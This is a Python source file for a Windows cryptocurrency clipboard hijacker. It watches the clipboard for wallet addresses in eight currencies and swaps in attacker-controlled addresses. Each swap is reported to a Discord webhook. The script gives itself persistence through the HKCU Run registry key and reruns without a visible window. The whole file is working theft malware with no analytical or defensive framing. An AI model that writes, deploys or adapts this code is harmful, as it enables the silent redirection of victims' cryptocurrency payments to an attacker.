import re
import pyperclip
import time
import requests
import threading
import winreg
import os
import sys
import subprocess

ATTACKER_ADDRESSES = {
    'BTC': 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
    'LTC': 'ltc1q2x2kgdygjrsqtzq2n0yrf2493p83kkfjhx0abc',
    'ETH': '0x1234567890abcdef1234567890abcdef12345678',
    'MATIC': '0x1234567890abcdef1234567890abcdef12345678',
    'BNB': 'bnb1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx',
    'XRP': 'rxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx',
    'ADA': 'addr1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx',
    'SOL': 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
}

DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1234567890/abcdef'

CRYPTO_PATTERNS = {
    'BTC': r'^(bc1|[13])[a-zA-Z0-9]{25,39}$',
    'LTC': r'^(ltc1|[LM3])[a-zA-Z0-9]{25,39}$',
    'ETH': r'^0x[a-fA-F0-9]{40}$',
    'MATIC': r'^0x[a-fA-F0-9]{40}$',
    'BNB': r'^bnb1[a-z0-9]{38}$',
    'XRP': r'^r[0-9a-zA-Z]{33,34}$',
    'ADA': r'^addr1[a-z0-9]{58,}$',
    'SOL': r'^[1-9A-HJ-NP-Za-km-z]{32,44}$'
}

def is_valid_address(address, coin_type):
    pattern = CRYPTO_PATTERNS.get(coin_type)
    return bool(re.match(pattern, address))

def send_discord_notification(original_address, new_address, coin_type):
    payload = {
        'content': f'¡Dirección reemplazada!\n**Tipo**: {coin_type}\n**Original**: {original_address}\n**Nueva**: {new_address}'
    }
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
    except Exception:
        pass

def add_to_startup():
    try:
        script_path = os.path.abspath(sys.argv[0])
        if script_path.endswith('.py'):
            executable = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')
            command = f'"{executable}" "{script_path}"'
        else:
            command = f'"{script_path}"'
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "CryptoClipper", 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)
    except Exception:
        pass

def monitor_clipboard():
    recent_value = ""
    while True:
        try:
            clipboard_content = pyperclip.paste()
            if clipboard_content != recent_value:
                recent_value = clipboard_content
                replaced = False
                for coin_type in CRYPTO_PATTERNS:
                    if is_valid_address(clipboard_content, coin_type):
                        attacker_address = ATTACKER_ADDRESSES[coin_type]
                        pyperclip.copy(attacker_address)
                        send_discord_notification(clipboard_content, attacker_address, coin_type)
                        time.sleep(0.1)
                        pyperclip.copy(attacker_address)
                        replaced = True
                        break
                if replaced:
                    time.sleep(0.1)
                    pyperclip.copy(attacker_address)
        except Exception:
            pass
        time.sleep(0.5)

def main():
    add_to_startup()
    if sys.executable.endswith('python.exe') and sys.argv[0].endswith('.py'):
        script_path = os.path.abspath(sys.argv[0])
        pythonw_path = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')
        subprocess.Popen([pythonw_path, script_path], creationflags=subprocess.CREATE_NO_WINDOW)
        sys.exit()
    clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
    clipboard_thread.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()